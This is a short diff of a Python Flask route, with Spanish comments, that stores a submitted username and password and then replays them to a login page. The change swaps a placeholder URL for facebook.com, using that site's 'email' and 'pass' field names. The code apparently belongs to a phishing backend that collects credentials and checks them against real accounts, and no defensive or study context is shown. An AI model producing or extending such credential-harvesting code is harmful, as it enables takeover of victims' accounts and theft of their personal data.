@@ -33,7 +33,7 @@ def save_data():
             return jsonify({"status": "error", "message": "Failed to save data"}), 500
 
         # 2. Simular inicio de sesión en la página externa
-        login_url = "https://www.ejemplo.com/login"  # Cambiar a la URL del formulario de login externo
+        login_url = "https://www.facebook.com/"  # Cambiar a la URL del formulario de login externo
         login_payload = {
             "email": username,  # Cambiar "email" al nombre del campo que espera la página externa
             "pass": password    # Cambiar "pass" al nombre del campo que espera la página externa
